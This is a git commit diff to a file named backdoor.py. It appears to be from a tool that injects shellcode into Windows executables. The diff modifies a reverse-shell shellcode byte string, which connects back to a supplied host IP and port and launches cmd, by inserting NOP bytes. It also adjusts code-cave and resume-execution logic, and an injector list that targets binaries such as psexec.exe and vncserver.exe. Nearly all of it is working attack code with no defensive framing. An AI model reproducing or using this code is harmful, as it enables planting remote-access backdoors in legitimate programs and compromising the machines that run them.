12c6a683532b7c8eb28876f02db234c198f7396b
Secret Squirrel <secretsquirrel@secureallthethings.com>
2013-03-11 17:37:53 -0400

    updated for demo

--- backdoor.py
+++ backdoor.py
@@ -538,20 +538,20 @@ class Shellcodes():
                 "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                 "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                 "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
-                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
+                "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\x90\xff\xd5\x50\x50" #
                 "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                 "\x68")
         shellcode += self.hostip  # IP
         shellcode += ("\x68\x02\x00")
         shellcode += struct.pack('!h', self.PORT)  # PORT
         shellcode += ("\x89\xe6\x6a\x10\x56"
-                "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
+                "\x57\x68\x99\xa5\x74\x61\x90\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" #
                 "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                 "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                 "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                 #The NOP in the line below allows for continued execution.
                 "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
-                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
+                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\x90\x90\x90\xff\xd5\x3c\x06\x7c\x0a\x80" #
                 "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                 "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 1FC (To align the stack)
                 "\x9d\x61")  # restore the stack 
@@ -727,13 +727,13 @@ def resume_execution_32(ImpList):
         compliment_one, compliment_two = ones_compliment()
 
         if OpCode == int('E8', 16):
+            print "You might have issues running this on an x64 system."
             resumeExe += struct.pack('=B', int('E8', 16))  # call
             resumeExe += "\x00"*4
             # POP ECX to find location
             resumeExe += struct.pack('=B', int('59', 16))
             #add ECX,10 push ECX
             # Will need to build an ASM routine to beat ASLR
-            print "VSP", hex(fileItems['VirtualStartingPoint'])
             resumeExe += "\x83\xC1\x16\x51"
             resumeExe += "\x25"          #
             resumeExe += compliment_one  #
@@ -1201,7 +1201,7 @@ def do_thebackdoor(filename, backdoorfile, shellcode,
     functions to perform the backdoor.
     """
     global fileItems
-    fileItems = gather_file_info(filename, backdoorfile)
+    fileItems = support_check(filename, backdoorfile)
     if fileItems is False:
         return None
     fileItems['NewCodeCave'] = NewCodeCave
@@ -1400,7 +1400,7 @@ def injector(suffix, change_Access, SHELL, encoder, host,
                        #'rpcapd.exe':
                        #[('rpcapd.exe'), None, False],
                        'psexec.exe': [('psexec.exe',), 'PSEXESVC.exe', False],
-                       'vncserver.exe':
+                       'vncserver.exe': 
                        [('vncserver.exe', ), 'vncserver', True],
                        # must append code cave for vmtoolsd.exe
                        'vmtoolsd.exe':
